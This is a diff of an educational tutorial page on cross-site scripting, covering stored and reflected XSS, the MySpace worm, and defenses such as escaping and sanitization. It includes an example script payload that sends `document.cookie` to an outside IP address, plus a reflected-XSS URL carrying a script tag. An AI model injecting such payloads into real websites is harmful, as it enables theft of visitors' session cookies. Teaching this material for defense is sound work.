@@ -47,11 +47,8 @@ That's a very nice picture! <br>
 Good photograph! <br>
 I **like** your photograph!
 
-HTML also supports <trigger for="modal:script">`<script>`</trigger>, for you to write `JavaScript` code on the webpage as well. 
-
-<modal title="**`<script>` and `</script>` in html**" id="modal:script">
-In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>. 
-</modal>
+HTML also supports <tooltip content="In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>. 
+">`<script>`</tooltip>, for you to write `JavaScript` code on the webpage as well. 
 
 What happens when a malicious user submits the following as a comment?
 
@@ -68,42 +65,39 @@ This is an innocent looking comment.
 
 Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. 
 
-The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <trigger for="modal:cookie">cookie</trigger> is stolen. 
+The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <tooltip content="A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.">cookie</tooltip> is stolen. 
 
-<modal title="**What is a Cookie?**" id="modal:cookie">
-A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data. You can read more about it <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank">here</a>.
-</modal>
 
 Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.
 
-> Trivia: The term "Cross Site Scripting" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data from the victim's website/deface the page (hence "Cross Site"). Such attacks are no longer possible today, and the modern definition of "Cross Site Scripting" includes attacks that do not need to be on a separate website to work.
+<box> Trivia: The term "Cross Site Scripting" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data from the victim's website/deface the page (hence "Cross Site"). Such attacks are no longer possible today, and the modern definition of "Cross Site Scripting" includes attacks that do not need to be on a separate website to work.</box>
 
 ## Types of XSS
 
 There are no standard definitions, but there are at least two different types of
 XSS:
 
-* Persistent XSS (also known as stored XSS) - The injected `JavaScript` code gets stored in
+* **Persistent XSS** (also known as stored XSS) - The injected `JavaScript` code gets stored in
 the web server. Example: Posting a malicious `JavaScript` code into a blog post as
 a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious `JavaScript` code automatically.
 
-* Non-persistent XSS (also known as reflected XSS) - The `JavaScript` code is
+* **Non-persistent XSS** (also known as reflected XSS) - The `JavaScript` code is
 inserted in URL/links of website that accepts URL parameters as input. The input
 is not stored in the server database.
 
-An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:
+    An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:
 
-`https://www.ecard.com/view-ecard.php?content=Happy%20Holidays`
+    `https://www.ecard.com/view-ecard.php?content=Happy%20Holidays`
 
-However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:
+    However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:
 
-`https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`
+    `https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`
 
 ## Well-Known XSS Incidents
 
 **MySpace Worm**
 
-In 2005, MySpace allowed users to customise their profiles using HTML code. This allowed for diversity of profiles but also allowed Samy Kamkar to find an XSS vulnerability. 
+In 2005, MySpace allowed users to customise their profiles using HTML code. This allowed for diversity of profiles but also allowed a user named Samy Kamkar to find an XSS vulnerability. 
 
 Samy Kamkar wrote a script which made people who visited his profile send him a friend request, and list Samy’s in their own profile’s “My Heroes” section. Not only that, he also programmed the script to copy itself onto the visitor's profile. Within a day, he had 1 million friend requests. 
 
@@ -132,26 +126,27 @@ You can still see this tweet <a href="https://twitter.com/dergeruhn/status/47676
 There are a couple of ways to prevent your website against XSS. The two most
 common ways are:
 
-**Escaping String Input** <br>
+* **Escaping String Input** <br>
 By converting legal HTML characters to their
 display-equivalent (e.g. `<` to `&lt;`), you prevent the symbol from being
 parsed as HTML. It now even shows the content on the screen (in case the actual
 intention is to actually show someone how to code for example).
-In the above example, the comment section will become like this: 
-> **Comments Section** <br>
-That's a very nice picture! <br>
-Good photograph! <br>
-I **like** your photograph! <br>
-This is an innocent looking comment. `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>`
+In the above example, the comment section will become like this:
 
-The `<script>` and `</script>` will be displayed as text rather than being run as `JavaScript` by the browser.
+    > **Comments Section** <br>
+    That's a very nice picture! <br>
+    Good photograph! <br>
+    I **like** your photograph! <br>
+    This is an innocent looking comment. `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>`
 
-**Whitelist Sanitization** <br>
+    The `<script>` and `</script>` will be displayed as text rather than being run as `JavaScript` by the browser.
+
+* **Whitelist Sanitization** <br>
 By scanning and parsing the input as HTML, you can
 remove undesired HTML elements, and only allowing certain whitelisted HTML
 elements to be used (e.g. whitelisting only `<b>` and `<i>`).
 
-*Note that these two ways alone are not enough to protect your web application against XSS attacks. Sophisticated attacks will make use of the different possible user inputs to inject code or illegal characters that are not limited to `<script>...</script>`. It is important to note where the user input is going to be generated in the output.*
+Note that these two ways alone are not enough to protect your web application against XSS attacks. Sophisticated attacks will make use of the different possible user inputs to inject code or illegal characters that are not limited to `<script>...</script>`. It is important to note where the user input is going to be generated in the output.
 
 For example, if you are building a profile page and allow user to add their own links to certain buttons:
 
@@ -171,12 +166,9 @@ You can also consider using XSS scanning tools to check whether your web applica
 
 ## Where to go from here?
 
-Although XSS is the most common web application vulnerability, there are also many other types of vulnerabilities. It is important to be aware of them to properly secure your web application. Here is a statistical 
-<a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">report</a> on web application vulnerabilities and a graphical summary retrieved from it: 
+Although XSS is the most common web application vulnerability, there are also many other types of vulnerabilities. It is important to be aware of them to properly secure your web application. Given below is a summary of web application vulnerabilities (for the full report see <a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">here</a>):
 
 ![Graphical Statistic](./Images/StatisticGraphic.png)
-
-Here, you can see many other web application security vulnerabilities. You can learn about SQL Injection [here](../sqlInjection.html) and Cross Site Request Forgery [here](../crossSiteRequestForgery/crossSiteRequestForgery.html).
 
 ## Resources
 
